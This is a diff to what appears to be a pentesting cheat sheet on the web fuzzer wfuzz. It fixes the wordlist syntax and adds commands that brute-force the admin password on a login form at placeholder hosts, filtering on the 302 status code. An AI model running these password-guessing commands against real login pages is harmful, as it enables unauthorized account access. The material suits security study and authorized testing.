@@ -11,7 +11,7 @@ render_with_liquid: false
 
 ```sh
 # Query parameter
-wfuzz -z,file /usr/share/wordlists/rockyou.txt http://10.0.0.1/?q=FUZZ
+wfuzz -z file,/usr/share/wordlists/rockyou.txt http://10.0.0.1/?q=FUZZ
 ```
 
 <br />
@@ -21,5 +21,9 @@ wfuzz -z,file /usr/share/wordlists/rockyou.txt http://10.0.0.1/?q=FUZZ
 ```sh
 # --hc: Hide status code
 # --hh: Hide chars (Content-Length)
-wfuzz -z,file /usr/share/wordlists/rockyou.txt -d "username=FUZZ&password=FUZZ" --hc 302 http://10.0.0.1/login
+wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" --hc 302 http://vulnerable.com/login
+
+# --sc: Show statuc code
+# --sh: Show chars (Content-Length)
+wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" --sc 302 http://vulnerable.com/login
 ```
